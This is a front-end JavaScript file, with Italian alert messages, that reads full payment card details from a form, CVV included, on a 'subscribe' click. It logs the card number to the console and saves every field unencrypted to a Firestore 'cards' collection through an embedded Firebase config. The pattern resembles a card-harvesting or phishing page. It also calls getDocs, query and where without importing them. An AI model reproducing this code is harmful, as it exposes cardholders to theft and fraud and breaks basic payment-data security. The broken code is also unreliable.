import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-analytics.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAGoB74Ce_Jxe1hkCcQMkyQSEUreH2ntkE",
  authDomain: "mercury-580ed.firebaseapp.com",
  projectId: "mercury-580ed",
  storageBucket: "mercury-580ed.appspot.com",
  messagingSenderId: "399781289148",
  appId: "1:399781289148:web:8ab7b6c67927cee361c4b9",
  measurementId: "G-7532J1B7NJ"
};

async function saveCardDataToFirestore(cardNumber, cardHolderName, expiryDate, cvv, postalCode, country, province) {
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getFirestore(app);

  try {
    
    const cardsRef = collection(db, 'cards');
    const querySnapshot = await getDocs(query(cardsRef, where('cardNumber', '==', cardNumber)));

    if (!querySnapshot.empty) {
      
      alert('Questa carta è già registrata.');
      return;
    }
    
    await addDoc(collection(db, 'cards'), {
      cardNumber,
      cardHolderName,
      expiryDate,
      cvv,
      postalCode,
      country,
      province,
    });
    alert('Dati della carta salvati con successo');
    window.location.href='page.html';
  } catch (error) {
    alert('Errore durante il salvataggio dei dati della carta nel database: ' + error.message);
  }
}


function handleSubscribeButtonClick() {
  
  const cardNumber = document.querySelector('input[placeholder="CARD NUMBER"]').value;
  const cardHolderName = document.querySelector('input[placeholder="FIRST NAME"]').value +
    ' ' + document.querySelector('input[placeholder="USERNAME"]').value;
  const expiryDate = document.getElementById('birthdate').value;
  const cvv = document.querySelector('input[placeholder="000"]').value;
  const postalCode = document.querySelector('input[placeholder="POSTAL"]').value;
  const country = document.getElementById('nazioni').value;
  const province = document.getElementById('citta').value;
  console.log(cardNumber);

 
  saveCardDataToFirestore(cardNumber, cardHolderName, expiryDate, cvv, postalCode, country, province);
}


document.addEventListener('DOMContentLoaded', function() {
  const subscribeButton = document.querySelector('.transparent-button');
  subscribeButton.addEventListener('click', handleSubscribeButtonClick);
});